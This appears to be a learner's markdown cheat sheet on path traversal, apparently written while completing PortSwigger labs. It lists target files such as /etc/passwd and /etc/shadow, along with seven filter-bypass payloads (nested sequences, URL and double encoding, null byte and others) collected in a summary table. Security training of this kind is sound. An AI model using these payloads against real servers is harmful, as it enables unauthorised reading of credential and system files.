# Path Traversal

## What is it
Accessing files outside the web root by manipulating
file path inputs — reading sensitive server files.

## Target files
- Linux: /etc/passwd, /etc/shadow, /etc/hosts
- Windows: C:\Windows\win.ini, C:\boot.ini

## Bypass techniques

### 1 — Basic traversal
```
../../../etc/passwd
```

### 2 — Absolute path
```
/etc/passwd
```
Works when app blocks ../ but not absolute paths.

### 3 — Nested sequences
```
....//....//....//etc/passwd
```
App strips ../ once revealing another ../ underneath.

### 4 — URL encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```
Server strips ../ but doesn't recognize encoded version.

### 5 — Double URL encoding
```
%252e%252e%252f%252e%252e%252f
```
Server decodes once → still encoded → passes check
App decodes again → reveals ../

### 6 — Base folder bypass
```
/var/www/images/../../../etc/passwd
```
Satisfies start check then traverses out.

### 7 — Null byte bypass
```
../../../etc/passwd%00.png
```
Validation sees .png extension ✅
Filesystem stops at %00, ignores .png

## How to find base folder
- Error messages leak full paths
- Check /etc/apache2/sites-enabled/ config
- Try common defaults:
  - /var/www/html/
  - /var/www/images/
  - /usr/share/nginx/html/

## All bypass techniques summary

| Technique | Payload |
|---|---|
| Basic | ../../../etc/passwd |
| Absolute path | /etc/passwd |
| Nested sequences | ....//....//....//etc/passwd |
| URL encoded | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd |
| Double URL encoded | %252e%252e%252f%252e%252e%252f |
| Base folder bypass | /var/www/images/../../../etc/passwd |
| Null byte | ../../../etc/passwd%00.png |

## Labs completed
- PortSwigger Path Traversal labs ✅ (all 6)
